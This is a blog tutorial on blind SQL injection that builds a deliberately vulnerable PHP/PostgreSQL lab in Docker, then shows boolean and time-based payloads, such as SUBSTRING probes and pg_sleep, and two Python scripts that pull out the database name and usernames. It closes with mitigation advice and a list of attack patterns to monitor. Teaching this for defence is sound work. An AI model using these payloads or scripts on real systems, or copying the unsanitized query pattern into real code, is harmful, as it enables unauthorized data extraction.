---
title: Blind Sql Injections
Date: 2025-04-17
image: avatar.png
autoimage: yes
description: Dexter
Categories: Web Security
author: Dexter
comments: true

---
## Introduction
Blind SQL Injection (Blind SQLi) is a more advanced and subtle type of SQL injection vulnerability where an attacker cannot directly view the results of their injected query. Unlike traditional SQL injections, where an attacker can see error messages or query results returned in the HTTP response, Blind SQL Injection does not reveal any information from the database directly. Instead, attackers must rely on the application's behavior, such as response time or page content changes, to infer the outcome of their queries.

This technique is often used when an application fails to properly handle SQL queries, leaving it vulnerable to attackers who can manipulate the SQL statements. The lack of direct feedback makes Blind SQL Injection more challenging to detect and exploit, but the potential consequences—such as unauthorized access to sensitive data—are just as severe.

Blind SQL Injection is generally categorized into two types:

Boolean-based Blind SQL Injection: This approach involves asking the database true or false questions and observing the application's response to determine if the condition is true or false.

Time-based Blind SQL Injection: In this case, the attacker injects SQL queries that introduce a time delay in the database's response. By measuring the response time, the attacker can deduce whether the condition in the query is true or false.

Both techniques allow attackers to extract sensitive information from the database without directly seeing the data returned by the queries. In this post, we’ll explore the mechanics of Blind SQL Injection, how to identify vulnerabilities, and methods to mitigate these risks.

### Boolean-Based Blind Injecion

This is a type of SQL injection where the attacker sends SQL queries to the database to force the application to return different results based on whether the query returns a true or a false result. This technique does not really reveal any data from the data but it allows the attacker to infer information based on the response. This method is very useful when the application shows generic error messages or no messages at all. This can be used to enumerate the database by asking a series of true or false questions, which eventually can be used to extract information. 

An example URL would be `http://example.com/blind.php?id=1`  this sends the query `SELECT * FROM users WHERE id = 1`. The attacker may then try and inject a query that returns false `http://example.com/blind.php?id=1 AND 1=2`. Where the SQL query looks like `SELECT * FROM users WHERE id = 1 AND 1=2`

To better understand how blind SQL injection vulnerabilities can occur in real world scenarios, let us walk through a simple example of insecure code. The following snippet represents a common pattern found in many web applications where user input is accepted and embedded without any proper validation or sanitization. While the functionality may seem harmless on the surface, it opens the door to serious vulnerabilities where the input is not handled securely. 
In this particular case the application does not return database errors or visible query results. However sensitive data can be extracted. 

```php
<?php

$user_id = isset($_GET['id']) ? $_GET['id'] : '1'; // unsanitized input

$conn = pg_connect("host=mydb port=5432 dbname=user user=user password=password") or die("Could not connect: ". pg_last_error());
$query = "SELECT * FROM users WHERE id = ". $user_id;
$result = pg_query($conn, $query) or die('Query failed: '. pg_last_error());

if (pg_num_rows($result)> 0) {
  echo "User exists.";
} else {
  echo "User not found.";
}

pg_free_result($result);
pg_close($conn);
?>
```

The script takes an `id` parameter from the URL `?id=1` and stores it in the `$user_id` variable, if there is no ID provided it defaults to 1. 

We can use Docker so that we can see this examples working locally

```Dockerfile
FROM php:7.4-apache

# Install PostgreSQL client libraries
RUN apt-get update && \
    apt-get install -y python3-pip && \
    apt-get install -y libpq-dev postgresql-client && \
    docker-php-ext-install pdo pdo_pgsql pgsql && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

RUN python3 -m pip install requests

# Copy your PHP file
COPY blind.php /var/www/html/

# Set proper permissions
RUN chown -R www-data:www-data /var/www/html

# Expose port 80
EXPOSE 80

# Health check (optional)
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost/ || exit 1
```
Then we can add a script that will link the database to the web app and do all the necessary docker configurations, including also creating a network
```sh
#!/bin/bash

sudo docker build -t php-blind .
sudo docker network create net-sql

sudo docker run -d --name mydb -e POSTGRES_USER=user -e POSTGRES_PASSWORD=password -e POSTGRESS_DB=users -p 5432:5432 --network net-sql -v "$(pwd)/init.sql:/docker-entrypoint-initdb.d/init.sql" postgres

sudo docker run -d --name blind_webapp -p 8080:80 --network net-sql php-blind
```

We can also create a SQL dump as dummy data we can use in the web application 

```sql
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) NOT NULL UNIQUE,
    email VARCHAR(150) NOT NULL UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (id, username, email)
VALUES
(1, 'admin', 'admin@example.com'),
(2, 'jane_doe', 'jane@example.com');

SELECT setval(pg_get_serial_sequence('users', 'id'), (SELECT MAX(id) FROM users));
```

We can now visit our local web application on `http://localhost:8080/blind.php`

![blind_php](https://i.ibb.co/Zp7XQZht/image.png)

So now we can test if our query works 

![id_1](https://i.ibb.co/wrW04NwK/image.png)

The query here would be 

```sql
SELECT * FROM users WHERE id = 1;
```

Now we can try and inject a boolean expression that will always return true `1=1` 

![inject](https://i.ibb.co/Y622pTG/image.png)

```sql
SELECT * FROM users WHERE id = 1 AND 1=1;
```

This returns with `User exists`  which in other words means it is true, then that confirms to us that the web application is injectable. Now is where the fun begins. 

For example we can get the total characters in the database. 
![chars](https://i.ibb.co/nNFnRDJB/image.png)

This query tries to get the length of characters of the database, and we equal it to 1. We get back a `User not found` response which means that it is false. 

```sql
SELECT * FROM users WHERE id = 1 AND LENGTH(current_database())=1;
```

If we get the number correct then the application will return a `User exists` like so, 

![exists](https://i.ibb.co/PLWjbt9/image.png)

We could go ahead as well and find the name of the database as a way of enumeration. 

![database_name](https://i.ibb.co/23YBrnG3/image.png)

```sql
SELECT * FROM users WHERE id = 1 AND SUBSTRING(current_database(), 1,1) = 'a'
```

This queries the first character of the database name, and this checks if the first character is `a` if yes, then it should return `User exists` and this would hint to us that the first character of the database name is `a`. 

Now we could create an automation script with python that will help us make this enumeration faster

```python
import requests

url = "http://localhost:8080/blind.php"
chars = "qwertyuiopasdfghjklzxcvbnm"

db_name = " "

for position in range(1, 5):
    for char in chars:
        payload = f"1 AND SUBSTRING(current_database(), {position},1) = '{char}'"
        response = requests.get(url, params={"id": payload})

        if "User exists" in response.text:
            db_name += char

            print(f"Found Character {position}: {char}")
            break

    print(f"Database name: {db_name}")
```

Let us run the script 

![script](https://i.ibb.co/JjDWXHGX/image.png)

The script goes through all the characters provided and prints each character that returned a `User exists`. The logs would look like so 

![log](https://i.ibb.co/Z6F1ynG9/image.png)

We can also enumerate for usernames using an automated script in python as well where all the query is: 

```sql
SELECT * FROM users WHERE id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET 0), 1, 1) = 'a'
```
For the python script it looks kind of similar to the one we worked with previously, but now with a different payload. 

```python
import requests

# Target URL and payload template
url = "http://localhost:8080/blind.php?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}'"

# Function to enumerate usernames
def enumerate_usernames():
    for offset in range(0, 3):  # Assuming there are 4 users.
        username = ""
        for position in range(1, 15):  # Assuming usernames are at most 15 characters long
            for char in "abcdefghijklmnopqrstuvwxyz":
                payload = url.format(offset=offset, position=position, char=char)
                response = requests.get(payload)
                if "User exists." in response.text:
                    username += char
                    print(f"Found character {char} at position {position} for user {offset + 1}")
                    break
        print(f"User {offset + 1}: {username}")

# Run the function to start enumeration
enumerate_usernames()

```

This automated script helps us find two users, `admin` and `janedoe`

![usernames](https://i.ibb.co/5gbBwG3M/image.png)

### Time-Based Blind Injection

There are times where the application returns absolutely no clues at all. Here attackers can resort to time-based attacks. Here they would still resort to using a series of questions to extract information from the database server, the difference this time is that the injected code will cause the server to delay in its response if the response is true. In the same way an immediate response is interpreted as a no. For example. 

![time](https://i.ibb.co/0jg0fPyP/image.png)

```sql
SELECT * FROM users WHERE id = 1; SELECT pg_sleep(10);
```

If this is true then the server will delay for 10 seconds before replying back with `User exists`. Similar payloads to Boolean based injections can also be utilized with Time-based injections in order to enumerate the database for information. 

## Mitigating injection risks

1. Use Prepared Statements (Parameterized Queries)
This is the most effective method to prevent SQL injection. Prepared statements ensure that user input is treated strictly as data, not as part of the SQL syntax.

PHP with PostgreSQL Example:
```php
$conn = pg_connect("host=mydb port=5432 dbname=user user=user password=password");

// Prepare the query with placeholders
pg_prepare($conn, "get_user", "SELECT * FROM users WHERE id = $1");

// Execute the query safely with user input
pg_execute($conn, "get_user", array($user_id));
Even if an attacker tries to inject SQL into id, it will not be executed as part of the query.
```

2. Validate and Sanitize User Input
Never trust user input. Always validate and sanitize it, even when using prepared statements.

Example for numeric input:

```php
if (!ctype_digit($user_id)) {
    die("Invalid ID format.");
}
```
Use whitelisting wherever possible, allowing only expected formats or characters.

3. Avoid Revealing Logical Clues or Error Messages
In blind SQL injection attacks, attackers rely on feedback from the application. Avoid returning different responses for true/false conditions.

Instead of this:
```php
if (pg_num_rows($result) > 0) {
    echo "User exists.";
} else {
    echo "User not found.";
}
```

Use a neutral response:
```php
echo "We received your request.";
```

Also, avoid exposing raw database errors like:

```php
or die(pg_last_error()); // Not safe
```

Instead, log errors internally and return a generic message.

4. Disable Detailed Error Output in Production
Exposing detailed errors can help attackers understand your database structure.

In PHP: set display_errors = Off
Log errors to a secure file
Show only a user-friendly message

```php
ini_set('display_errors', 0);
error_log("DB query failed: " . pg_last_error());
echo "An error occurred. Please try again later.";
```

5. Apply the Principle of Least Privilege
Ensure the database user your application connects with has only the permissions it absolutely needs.

Avoid using admin or superuser accounts for regular queries
Deny `DROP`, `DELETE`, `ALTER`, or other high-risk permissions unless necessary
This limits the potential damage if an injection succeeds.

6. Use a Web Application Firewall (WAF)
A WAF can help detect and block common SQL injection patterns, such as:

Use of UNION, OR 1=1, or pg_sleep
Repeated or automated requests (e.g., from sqlmap)
While not a replacement for secure coding, a WAF adds an extra layer of protection and visibility.

7. Log and Monitor for Suspicious Activity
Regularly review logs to detect unusual patterns or probing behavior.

Look for:

Sequential requests with modified query parameters (id=1, id=1 AND 1=1, etc.)
SQL keywords appearing in URLs or GET parameters
Requests with automation tool signatures (sqlmap, python-requests)
Integrating alerts into a monitoring system helps catch attacks early.

## Resources

1. [Owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
2. [Invicti](https://www.invicti.com/blog/web-security/how-blind-sql-injection-works/)
3. [Portswigger](https://portswigger.net/web-security/sql-injection/blind#what-is-blind-sql-injection)

## Comments

{{< chat disqus_thread >}}


---
